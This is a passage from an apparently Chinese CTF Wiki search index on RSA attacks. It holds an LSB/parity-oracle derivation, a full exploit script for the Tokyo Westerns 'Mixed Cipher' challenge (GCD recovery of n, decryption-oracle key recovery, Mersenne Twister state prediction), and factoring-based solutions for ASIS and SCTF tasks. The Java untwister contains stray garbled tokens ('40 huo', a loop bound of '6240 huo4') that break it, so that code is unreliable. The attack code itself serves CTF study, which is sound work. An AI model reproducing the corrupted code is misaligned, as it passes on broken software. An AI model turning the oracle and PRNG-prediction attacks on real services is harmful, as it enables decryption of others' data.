&=\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1}+a_0*2^0*2^{-1}\\mod2\\\\ &\\equiv a_1+a_0*2^0*2^{-1}\\equiv y\\pmod2 \\end{aligned} y-(a_0*2^0)*2^{-1}=(m*2^{-1}\\mod2)-(a_0*2^0)*2^{-1}\\equiv a_1\\pmod2 y-(a_0*2^0)*2^{-1}=(m*2^{-1}\\mod2)-(a_0*2^0)*2^{-1}\\equiv a_1\\pmod2 \u7c7b\u4f3c\u7684 \\{(c(2^{-2*e_2}\\mod N_2))^{d_2}\\mod N_2\\}\\pmod2\\equiv m*2^{-2} \\{(c(2^{-2*e_2}\\mod N_2))^{d_2}\\mod N_2\\}\\pmod2\\equiv m*2^{-2} \\begin{aligned} &m*(2^{-2}\\mod N_2)\\mod2\\\\ &=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-2}\\mod2\\\\ &=[2^2(\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-2})+a_1*2^1+a_0*2^0]*2^{-2}\\mod 2\\\\ &=\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-1}+(a_1*2^1+a_0*2^0)*2^{-2}\\mod2\\\\ &\\equiv a_2+(a_1*2^1+a_0*2^0)*2^{-2}\\equiv y\\pmod2 \\end{aligned} \\begin{aligned} &m*(2^{-2}\\mod N_2)\\mod2\\\\ &=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-2}\\mod2\\\\ &=[2^2(\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-2})+a_1*2^1+a_0*2^0]*2^{-2}\\mod 2\\\\ &=\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-1}+(a_1*2^1+a_0*2^0)*2^{-2}\\mod2\\\\ &\\equiv a_2+(a_1*2^1+a_0*2^0)*2^{-2}\\equiv y\\pmod2 \\end{aligned} \\begin{aligned} &y-(a_1*2^1+a_0*2^0)*2^{-2}\\\\ &=(m*2^{-2}\\mod2)-(a_1*2^1+a_0*2^0)*2^{-2}\\equiv a_2\\pmod2 \\end{aligned} \\begin{aligned} &y-(a_1*2^1+a_0*2^0)*2^{-2}\\\\ &=(m*2^{-2}\\mod2)-(a_1*2^1+a_0*2^0)*2^{-2}\\equiv a_2\\pmod2 \\end{aligned} \u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u524di-1\u4f4d\u4e0eoracle\u7684\u7ed3\u679c\u6765\u5f97\u5230\u7b2ci\u4f4d\u3002\u6ce8\u610f\u8fd9\u91cc\u7684 2^{-1} 2^{-1} \u662f 2^1 2^1 \u6a21 N_1 N_1 \u7684\u9006\u5143\u3002\u6240\u4ee5\u5bf9\u5269\u4e0b\u7684\u4f4d\uff0c\u6709 \\begin{aligned} &\\{(c(2^{-i*e_i}\\mod N_i))^{d_i}\\mod N_i\\}\\pmod2\\equiv m*2^{-i}\\\\ &a_i\\equiv (m*2^{-i}\\mod2) -\\sum_{j=0}^{i-1}a_j*2^j\\pmod2,i=1,2,...,logm-1 \\end{aligned} \\begin{aligned} &\\{(c(2^{-i*e_i}\\mod N_i))^{d_i}\\mod N_i\\}\\pmod2\\equiv m*2^{-i}\\\\ &a_i\\equiv (m*2^{-i}\\mod2) -\\sum_{j=0}^{i-1}a_j*2^j\\pmod2,i=1,2,...,logm-1 \\end{aligned} \u5176\u4e2d 2^{-i} 2^{-i} \u662f 2^i 2^i \u6a21 N_i N_i \u7684\u9006\u5143\u3002 \u5c31\u53ef\u4ee5\u9010\u6b65\u6062\u590d\u539f\u6587\u6240\u6709\u7684\u4f4d\u4fe1\u606f\u4e86\u3002\u8fd9\u6837\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(logm) O(logm) \u3002 exp: from Crypto.Util.number import * mm = bytes_to_long ( b '12345678' ) l = len ( bin ( mm )) - 2 def genkey (): while 1 : p = getPrime ( 128 ) q = getPrime ( 128 ) e = getPrime ( 32 ) n = p * q phi = ( p - 1 ) * ( q - 1 ) if GCD ( e , phi ) > 1 : continue d = inverse ( e , phi ) return e , d , n e , d , n = genkey () cc = pow ( mm , e , n ) f = str ( pow ( cc , d , n ) % 2 ) for i in range ( 1 , l ): e , d , n = genkey () cc = pow ( mm , e , n ) ss = inverse ( 2 ** i , n ) cs = ( cc * pow ( ss , e , n )) % n lb = pow ( cs , d , n ) % 2 bb = ( lb - ( int ( f , 2 ) * ss % n )) % 2 f = str ( bb ) + f assert ((( mm >> i ) % 2 ) == bb ) print ( long_to_bytes ( int ( f , 2 )))","title":"\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_7","text":"https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack https://pastebin.com/KnEUSMxp https://github.com/ashutosh1206/Crypton","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/rsa/rsa_complex/","text":"RSA \u590d\u6742\u9898\u76ee \u00b6 2018 Tokyo Western Mixed Cipher \u00b6 \u9898\u76ee\u7ed9\u7684\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a \u6bcf\u6b21\u4ea4\u4e92\u53ef\u4ee5\u7ef4\u6301\u7684\u65f6\u95f4\u957f\u5ea6\u7ea6\u4e3a 5 \u5206\u949f \u6bcf\u6b21\u4ea4\u4e92\u4e2d\u4e2dn\u662f\u786e\u5b9a\u7684 1024 bit\uff0c\u4f46\u662f\u672a\u77e5\uff0c e \u4e3a 65537 \u4f7f\u7528 aes \u52a0\u5bc6\u4e86 flag\uff0c\u5bc6\u94a5\u548c IV \u5747\u4e0d\u77e5\u9053 \u6bcf\u6b21\u5bc6\u94a5\u662f\u56fa\u5b9a\u7684\uff0c\u4f46\u662f IV \u6bcf\u6b21\u90fd\u4f1a\u968f\u673a \u53ef\u4ee5\u4f7f\u7528 encrypt \u529f\u80fd\u968f\u610f\u4f7f\u7528 rsa \u548c aes \u8fdb\u884c\u52a0\u5bc6\uff0c\u5176\u4e2d\u6bcf\u6b21\u52a0\u5bc6\u90fd\u4f1a\u5bf9 aes \u7684 iv \u8fdb\u884c\u968f\u673a \u53ef\u4ee5\u4f7f\u7528 decrypt \u5bf9\u968f\u610f\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u4f46\u662f\u53ea\u80fd\u77e5\u9053\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f\u4ec0\u4e48 \u53ef\u4ee5\u4f7f\u7528 print_flag \u83b7\u53d6 flag \u5bc6\u6587 \u53ef\u4ee5\u4f7f\u7528 print_key \u83b7\u53d6 rsa \u52a0\u5bc6\u7684 aes \u5bc6\u94a5 \u672c\u9898\u76ee\u770b\u4f3c\u4e00\u4e2a\u9898\u76ee\uff0c\u5b9e\u5219\u662f 3 \u4e2a\u9898\u76ee\uff0c\u9700\u8981\u5206\u6b65\u9aa4\u89e3\u51b3\u3002\u5728\u6b64\u4e4b\u524d\uff0c\u6211\u5011\u6e96\u5099\u597d\u4ea4\u4e92\u7684\u51fd\u6578 def get_enc_key ( io ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"4\" ) io . read_until ( \"here is encrypted key :)n\" ) c = int ( io . readline ()[: - 1 ], 16 ) return c def encrypt_io ( io , p ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"1\" ) io . read_until ( \"input plain text: \" ) io . writeline ( p ) io . read_until ( \"RSA: \" ) rsa_c = int ( io . readline ()[: - 1 ], 16 ) io . read_until ( \"AES: \" ) aes_c = io . readline ()[: - 1 ] . decode ( \"hex\" ) return rsa_c , aes_c def decrypt_io ( io , c ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"2\" ) io . read_until ( \"input hexencoded cipher text: \" ) io . writeline ( long_to_bytes ( c ) . encode ( \"hex\" )) io . read_until ( \"RSA: \" ) return io . read_line ()[: - 1 ] . decode ( \"hex\" ) GCD attack n \u00b6 \u7b2c\u4e00\u6b65\u6211\u4eec\u9700\u8981\u628a\u6ca1\u6709\u7ed9\u51fa\u7684 n \u7b97\u51fa\u6765\uff0c\u56e0\u4e3a\u6211\u4eec\u53ef\u4ee5\u5229\u7528 encrypt \u529f\u80fd\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u660e\u6587 x \u8fdb\u884c rsa \u52a0\u5bc6\uff0c\u90a3\u4e48\u53ef\u4ee5\u5229\u7528\u6574\u9664\u7684\u6027\u8d28\u7b97 n \u56e0\u4e3ax ^ e = c mod n \u6240\u4ee5 n | x ^ e - c \u6211\u4eec\u53ef\u4ee5\u6784\u9020\u8db3\u591f\u591a\u7684 x\uff0c\u7b97\u51fa\u6700\u591f\u591a\u7684 x ^ e - c\uff0c\u4ece\u800c\u8ba1\u7b97\u6700\u5927\u516c\u7ea6\u6570\uff0c\u5f97\u5230 n\u3002 def get_n(io): rsa_c,aes_c=encrypt_io(io,long_to_bytes(2)) n=pow(2,65537)-rsa_c for i in range(3,6): rsa_c, aes_c = encrypt_io(io, long_to_bytes(i)) n=primefac.gcd(n,pow(i,65537)-rsa_c) return n \u53ef\u4ee5\u5229\u7528\u52a0\u5bc6\u8fdb\u884c check def check_n ( io , n ): rsa_c , aes_c = encrypt_io ( io , \"123\" ) if pow ( bytes_to_long ( \"123\" ), e , n ) == rsa_c : return True else : return False RSA parity oracle \u00b6 \u5229\u7528 leak \u7684\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u4f7f\u7528 RSA parity oracle \u56de\u590d aes \u7684\u79d8\u94a5 def guess_m ( io , n , c ): k = 1 lb = 0 ub = n while ub != lb : print lb , ub tmp = c * gmpy2 . powmod ( 2 , k * e , n ) % n if ord ( decrypt_io ( io , tmp )[ - 1 ]) % 2 == 1 : lb = ( lb + ub ) / 2 else : ub = ( lb + ub ) / 2 k += 1 print ub , len ( long_to_bytes ( ub )) return ub PRNG Predict \u00b6 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u89e3\u5bc6 flag \u768416\u5b57\u8282\u4e4b\u540e\u7684\u5185\u5bb9\u4e86\uff0c\u4f46\u662f\u524d16\u4e2a\u5b57\u8282\u6ca1\u6709 IV \u662f\u89e3\u5bc6\u4e0d\u4e86\u7684\u3002\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0cIV \u751f\u6210\u4f7f\u7528\u7684\u968f\u673a\u6570\u4f7f\u7528\u4e86 getrandbits\uff0c\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230\u8db3\u591f\u591a\u7684\u968f\u673a\u6570\u91cf\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c PRNG \u7684 predict\uff0c\u4ece\u800c\u76f4\u63a5\u83b7\u53d6\u968f\u673a\u6570 \u8fd9\u91cc\u4f7f\u7528\u4e86\u4e00\u4e2a\u73b0\u6210\u7684\u7684 java \u8fdb\u884c PRNG \u7684 Predict public class Main { static int [] state ; static int currentIndex ; 40 huo public static void main ( String [] args ) { state = new int [ 624 ] ; currentIndex = 0 ; // initialize(0); // for (int i = 0; i < 5; i++) { // System.out.println(state[i]); // } // for (int i = 0; i < 5; i++) { // System.out.println(nextNumber()); // } if ( args . length != 624 ) { System . err . println ( \"must be 624 args\" ); System . exit ( 1 ); } int [] arr = new int [ 624 ] ; for ( int i = 0 ; i < args . length ; i ++ ) { arr [ i ] = Integer . parseInt ( args [ i ] ); } rev ( arr ); for ( int i = 0 ; i < 6240 huo4 ; i ++ ) { System . out . println ( state [ i ] ); } // System.out.println(\"currentIndex \" + currentIndex); // System.out.println(\"state[currentIndex] \" + state[currentIndex]); // System.out.println(\"next \" + nextNumber()); // want -2065863258 } static void nextState () { // Iterate through the state for ( int i = 0 ; i < 624 ; i ++ ) { // y is the first bit of the current number, // and the last 31 bits of the next number int y = ( state [ i ] & 0x80000000 ) + ( state [ ( i + 1 ) % 624 ] & 0x7fffffff ); // first bitshift y by 1 to the right int next = y >>> 1 ; // xor it with the 397th next number next ^= state [ ( i + 397 ) % 624 ] ; // if y is odd, xor with magic number if (( y & 1L ) == 1L ) { next ^= 0x9908b0df ; } // now we have the result state [ i ] = next ; } } static int nextNumber () { currentIndex ++ ; int tmp = state [ currentIndex ] ; tmp ^= ( tmp >>> 11 ); tmp ^= ( tmp << 7 ) & 0x9d2c5680 ; tmp ^= ( tmp << 15 ) & 0xefc60000 ; tmp ^= ( tmp >>> 18 ); return tmp ; } static void initialize ( int seed ) { // http://code.activestate.com/recipes/578056-mersenne-twister/ // global MT // global bitmask_1 // MT[0] = seed // for i in xrange(1,624): // MT[i] = ((1812433253 * MT[i-1]) ^ ((MT[i-1] >> 30) + i)) & bitmask_1 // copied Python 2.7's impl (probably uint problems) state [ 0 ] = seed ; for ( int i = 1 ; i < 624 ; i ++ ) { state [ i ] = (( 1812433253 * state [ i - 1 ] ) ^ (( state [ i - 1 ] >> 30 ) + i )) & 0xffffffff ; } } static int unBitshiftRightXor ( int value , int shift ) { // we part of the value we are up to (with a width of shift bits) int i = 0 ; // we accumulate the result here int result = 0 ; // iterate until we've done the full 32 bits while ( i * shift < 32 ) { // create a mask for this part int partMask = ( - 1 << ( 32 - shift )) >>> ( shift * i ); // obtain the part int part = value & partMask ; // unapply the xor from the next part of the integer value ^= part >>> shift ; // add the part to the result result |= part ; i ++ ; } return result ; } static int unBitshiftLeftXor ( int value , int shift , int mask ) { // we part of the value we are up to (with a width of shift bits) int i = 0 ; // we accumulate the result here int result = 0 ; // iterate until we've done the full 32 bits while ( i * shift < 32 ) { // create a mask for this part int partMask = ( - 1 >>> ( 32 - shift )) << ( shift * i ); // obtain the part int part = value & partMask ; // unapply the xor from the next part of the integer value ^= ( part << shift ) & mask ; // add the part to the result result |= part ; i ++ ; } return result ; } static void rev ( int [] nums ) { for ( int i = 0 ; i < 624 ; i ++ ) { int value = nums [ i ] ; value = unBitshiftRightXor ( value , 18 ); value = unBitshiftLeftXor ( value , 15 , 0xefc60000 ); value = unBitshiftLeftXor ( value , 7 , 0x9d2c5680 ); value = unBitshiftRightXor ( value , 11 ); state [ i ] = value ; } } } \u5199\u4e86\u4e00\u4e2a python \u76f4\u63a5\u8c03\u7528 java from Crypto.Util.number import long_to_bytes,bytes_to_long def encrypt_io(io,p): io.read_until(\"4: get encrypted keyn\") io.writeline(\"1\") io.read_until(\"input plain text: \") io.writeline(p) io.read_until(\"RSA: \") rsa_c=int(io.readline()[:-1],16) io.read_until(\"AES: \") aes_c=io.readline()[:-1].decode(\"hex\") return rsa_c,aes_c import subprocess import random def get_iv(io): rsa_c, aes_c=encrypt_io(io,\"1\") return bytes_to_long(aes_c[0:16]) def splitInto32(w128): w1 = w128 & (2**32-1) w2 = (w128 >> 32) & (2**32-1) w3 = (w128 >> 64) & (2**32-1) w4 = (w128 >> 96) return w1,w2,w3,w4 def sign(iv): # converts a 32 bit uint to a 32 bit signed int if(iv&0x80000000): iv = -0x100000000 + iv return iv def get_state(io): numbers=[] for i in range(156): print i numbers.append(get_iv(io)) observedNums = [sign(w) for n in numbers for w in splitInto32(n)] o = subprocess.check_output([\"java\", \"Main\"] + map(str, observedNums)) stateList = [int(s) % (2 ** 32) for s in o.split()] r = random.Random() state = (3, tuple(stateList + [624]), None) r.setstate(state) return r.getrandbits(128) EXP \u00b6 \u6574\u4f53\u653b\u51fb\u4ee3\u7801\u5982\u4e0b\uff1a from zio import * import primefac from Crypto.Util.number import long_to_bytes , bytes_to_long target = ( \"crypto.chal.ctf.westerns.tokyo\" , 5643 ) e = 65537 def get_enc_key ( io ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"4\" ) io . read_until ( \"here is encrypted key :)n\" ) c = int ( io . readline ()[: - 1 ], 16 ) return c def encrypt_io ( io , p ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"1\" ) io . read_until ( \"input plain text: \" ) io . writeline ( p ) io . read_until ( \"RSA: \" ) rsa_c = int ( io . readline ()[: - 1 ], 16 ) io . read_until ( \"AES: \" ) aes_c = io . readline ()[: - 1 ] . decode ( \"hex\" ) return rsa_c , aes_c def decrypt_io ( io , c ): io . read_until ( \"4: get encrypted keyn\" ) io . writeline ( \"2\" ) io . read_until ( \"input hexencoded cipher text: \" ) io . writeline ( long_to_bytes ( c ) . encode ( \"hex\" )) io . read_until ( \"RSA: \" ) return io . read_line ()[: - 1 ] . decode ( \"hex\" ) def get_n ( io ): rsa_c , aes_c = encrypt_io ( io , long_to_bytes ( 2 )) n = pow ( 2 , 65537 ) - rsa_c for i in range ( 3 , 6 ): rsa_c , aes_c = encrypt_io ( io , long_to_bytes ( i )) n = primefac . gcd ( n , pow ( i , 65537 ) - rsa_c ) return n def check_n ( io , n ): rsa_c , aes_c = encrypt_io ( io , \"123\" ) if pow ( bytes_to_long ( \"123\" ), e , n ) == rsa_c : return True else : return False import gmpy2 def guess_m ( io , n , c ): k = 1 lb = 0 ub = n while ub != lb : print lb , ub tmp = c * gmpy2 . powmod ( 2 , k * e , n ) % n if ord ( decrypt_io ( io , tmp )[ - 1 ]) % 2 == 1 : lb = ( lb + ub ) / 2 else : ub = ( lb + ub ) / 2 k += 1 print ub , len ( long_to_bytes ( ub )) return ub io = zio ( target , timeout = 10000 , print_read = COLORED ( NONE , 'red' ), print_write = COLORED ( NONE , 'green' )) n = get_n ( io ) print check_n ( io , n ) c = get_enc_key ( io ) print len ( decrypt_io ( io , c )) == 16 m = guess_m ( io , n , c ) for i in range ( m - 50000 , m + 50000 ): if pow ( i , e , n ) == c : aeskey = i print long_to_bytes ( aeskey )[ - 1 ] == decrypt_io ( io , c )[ - 1 ] print \"found aes key\" , hex ( aeskey ) import fuck_r next_iv = fuck_r . get_state ( io ) print \"##########################################\" print next_iv print aeskey io . interact () 2016 ASIS Find the flag \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 ASIS 2016 \u7ebf\u4e0a\u8d5b\u4e2d Find the flag \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u6587\u4ef6\u89e3\u538b\u51fa\u6765\uff0c\u6709\u4e00\u4e2a\u5bc6\u6587\uff0c\u4e00\u4e2a\u516c\u94a5\uff0c\u4e00\u4e2a py \u811a\u672c\u3002\u770b\u4e00\u4e0b\u516c\u94a5\u3002 \u279c RSA openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 :d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d: f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f: 20 :61:b9 Exponent: 12405943493775545863 ( 0xac2ac3e0ca0f5607 ) Modulus = D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9 \u8fd9\u4e48\u5c0f\u7684\u4e00\u4e2a N N \uff0c\u5148\u5206\u89e3\u4e00\u4e0b\u3002 p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 \u518d\u770b\u7ed9\u7684 py \u811a\u672c\u3002 #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 flag = open ( 'flag' , 'r' ) . read () * 30 def ext_rsa_encrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) pubkey = RSA . construct (( long ( n ), long ( e ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) return enc except : p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) f = open ( 'pubkey.pem' , 'w' ) f . write ( pubkey . exportKey ()) g = open ( 'flag.enc' , 'w' ) g . write ( ext_rsa_encrypt ( p , q , e , flag )) \u903b\u8f91\u5f88\u7b80\u5355\uff0c\u8bfb\u53d6 flag\uff0c\u91cd\u590d 30 \u904d\u4e3a\u5bc6\u6587\u3002\u968f\u673a\u53d6 p p \u548c q q \uff0c\u751f\u6210\u4e00\u4e2a\u516c\u94a5\uff0c\u5199\u5165 pubkey.pem \uff0c\u518d\u7528\u811a\u672c\u4e2d\u7684 ext_rsa_encrypt \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6\uff0c\u6700\u540e\u5c06\u5bc6\u6587\u5199\u5165 flag.enc \u3002 \u5c1d\u8bd5\u4e00\u4e0b\u89e3\u5bc6\uff0c\u63d0\u793a\u5bc6\u6587\u8fc7\u957f\uff0c\u518d\u770b\u52a0\u5bc6\u51fd\u6570\uff0c\u539f\u6765\u5f53\u52a0\u5bc6\u5931\u8d25\u65f6\uff0c\u51fd\u6570\u4f1a\u8df3\u5230\u5f02\u5e38\u5904\u7406\uff0c\u4ee5\u4e00\u5b9a\u7b97\u6cd5\u91cd\u65b0\u53d6\u66f4\u5927\u7684 p p \u548c q q \uff0c\u76f4\u5230\u52a0\u5bc6\u6210\u529f\u3002 \u90a3\u4e48\u6211\u4eec\u53ea\u8981\u4e5f\u5199\u4e00\u4e2a\u76f8\u5e94\u7684\u89e3\u5bc6\u51fd\u6570\u5373\u53ef\u3002 #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 def ext_rsa_decrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( privatekey ) de_error = '' enc = key . decrypt ( msg . decode ( 'base64' ), de_error ) return enc except Exception as error : print error p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 n = p * q e = 12405943493775545863 # pubkey = RSA.construct((long(n), long(e))) # f = open('pubkey.pem', 'w') # f.write(pubkey.exportKey()) g = open ( 'flag.enc' , 'r' ) msg = g . read () flag = ext_rsa_decrypt ( p , q , e , msg ) print flag \u62ff\u5230 flag ASIS{F4ct0R__N_by_it3rat!ng!} SCTF RSA1 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA1 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u89e3\u538b\u538b\u7f29\u5305\u540e\uff0c\u5f97\u5230\u5982\u4e0b\u6587\u4ef6 \u279c level0 git: ( master ) \u2717 ls -al \u603b\u7528\u91cf 4 drwxrwxrwx 1 root root 0 7\u6708 30 16 :36 . drwxrwxrwx 1 root root 0 7\u6708 30 16 :34 .. -rwxrwxrwx 1 root root 349 5\u6708 2 2016 level1.passwd.enc -rwxrwxrwx 1 root root 2337 5\u6708 6 2016 level1.zip -rwxrwxrwx 1 root root 451 5\u6708 2 2016 public.key \u5c1d\u8bd5\u89e3\u538b\u7f29\u4e86\u4e00\u4e0b level1.zip \u73b0\u9700\u8981\u5bc6\u7801\u3002\u7136\u540e\u6839\u636e level1.passwd.enc \u53ef\u77e5\uff0c\u5e94\u8be5\u662f\u6211\u4eec\u9700\u8981\u89e3\u5bc6\u8fd9\u4e2a\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u7801\u3002\u67e5\u770b\u516c\u94a5 \u279c level0 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8: 89 :d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c: 70 :87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c: 5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6: bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8: fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21: ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a: 2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8: 72 :1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5: 16 :36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac: c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7: 31 :56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49: cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69: d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b: 86 :94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20: eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46: b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06: 68 :81 Exponent: 65537 ( 0x10001 ) Modulus = 94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlKA+bg7c8nQQUu8e6qiJ 1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W k5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe RRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr V/XXUtcxVgurCuaNrQgiqR/LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG ZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo gQIDAQAB -----END PUBLIC KEY----- \u53d1\u73b0\u867d\u7136\u8bf4\u662f 2048 \u4f4d\uff0c\u4f46\u662f\u663e\u7136\u6a21\u6570\u6ca1\u6709\u90a3\u4e48\u957f\uff0c\u5c1d\u8bd5\u5206\u89e3\u4e0b\uff0c\u5f97\u5230 p=250527704258269 q=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 \u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\uff0c\u5e76\u4e14\u89e3\u5bc6\uff0c\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA import gmpy2 from base64 import b64decode p = 250527704258269 q = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 e = 65537 n = p * q def getprivatekey ( n , e , p , q ): phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level1.passwd.enc' ) as f : cipher = f . read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) #getprivatekey(n, e, p, q) decrypt () \u53d1\u73b0\u4e0d\u5bf9 \u279c level0 git: ( master ) \u2717 python exp.py \u4e00\u5806\u4e71\u7801\u3002\u3002 \u8fd9\u65f6\u5019\u5c31\u8981\u8003\u8651\u5176\u4ed6\u60c5\u51b5\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u73b0\u5b9e\u4e2d\u5b9e\u73b0\u7684 RSA \u90fd\u4e0d\u4f1a\u76f4\u63a5\u7528\u539f\u751f\u7684 RSA\uff0c\u90fd\u4f1a\u52a0\u4e00\u4e9b\u586b\u5145\u6bd4\u5982 OAEP\uff0c\u6211\u4eec\u8fd9\u91cc\u8bd5\u8bd5\uff0c\u4fee\u6539\u4ee3\u7801 def decrypt1 () : with open ( './level1.passwd.enc' ) as f: cipher = f.read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f: key = RSA.importKey ( f ) key = PKCS1_OAEP.new ( key ) print key.decrypt ( cipher ) \u679c\u7136\u5982\u6b64\uff0c\u5f97\u5230 \u279c level0 git: ( master ) \u2717 python exp.py FaC5ori1ati0n_aTTA3k_p_tOO_sma11 